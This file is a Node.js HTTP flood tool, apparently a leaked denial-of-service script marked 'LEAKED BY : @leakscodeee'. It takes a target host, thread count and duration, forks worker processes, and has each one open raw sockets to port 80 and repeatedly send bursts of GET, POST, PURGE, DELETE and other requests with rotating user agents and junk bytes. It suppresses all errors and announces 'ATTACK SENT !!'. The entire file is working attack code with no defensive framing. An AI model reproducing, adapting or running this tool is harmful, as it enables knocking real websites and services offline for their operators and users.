const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');

if (process.argv.length <= 3) {
	console.log(`
	
	
	
	
	LEAKED BY : @leakscodeee
	
	
	
	
	
	
	
    ░██████╗██╗░░░██╗██╗░░██╗██████╗░███╗░░██╗
    ██╔════╝╚██╗░██╔╝██║░░██║██╔══██╗████╗░██║
    ╚█████╗░░╚████╔╝░███████║██║░░██║██╔██╗██║
    ░╚═══██╗░░╚██╔╝░░██╔══██║██║░░██║██║╚████║
    ██████╔╝░░░██║░░░██║░░██║██████╔╝██║░╚███║
    ╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚══╝
    `);
	console.log(` [ HOST ] [ THREAD ] [ TIME ]`);
	process.exit(-1);
}

var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var threads = process.argv[3];
var time = process.argv[4];
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (e) { });
process.on('unhandledRejection', function (e) { });

let userAgents = [];
userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');

const nullHexs = [
"\x00", 
"\xFF", 
"\xC2", 
"\xA0",
"\x82",
"\x56",
"\x87",
"\x88",
"\x27",
"\x31",
"\x18",
"\x42",
"\x17",
"\x90",
"\x14",
"\x82",
"\x18",
"\x26",
"\x61",
"\x04",
"\x05",
"\xac",
"\x02",
"\x50",
"\x84",
"\x78"
];

if (cluster.isMaster) {
    for(let i = 0; i < threads; i++) {
        cluster.fork();
    }
    console.log(`
    
    
    
    
    
    
    
    LEAKED BY : @leakscodeee
    
    
    
    
    
    
    
    
    ░██████╗██╗░░░██╗██╗░░██╗██████╗░███╗░░██╗
    ██╔════╝╚██╗░██╔╝██║░░██║██╔══██╗████╗░██║
    ╚█████╗░░╚████╔╝░███████║██║░░██║██╔██╗██║
    ░╚═══██╗░░╚██╔╝░░██╔══██║██║░░██║██║╚████║
    ██████╔╝░░░██║░░░██║░░██║██████╔╝██║░╚███║
    ╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚══╝
    `);
    console.log(` ATTACK SENT !! `);
    setTimeout(() => {
        process.exit(1);
    }, time * 1000);

} else {
    startflood();
}

function startflood(){
    var int = setInterval(() => {
    var s = require('net').Socket();
    s.connect(80, host);
    s.setTimeout(10000);
    for (var i = 0; i < 64; i++) {
        s.write('GET ' + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write('HEAD ' + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		s.write('POST ' + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('PURGE ' + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('PUT ' + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		s.write('OPTIONS ' + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('DELETE ' + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('PATCH ' + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
});
    setTimeout(() => clearInterval(int), time * 1000);
}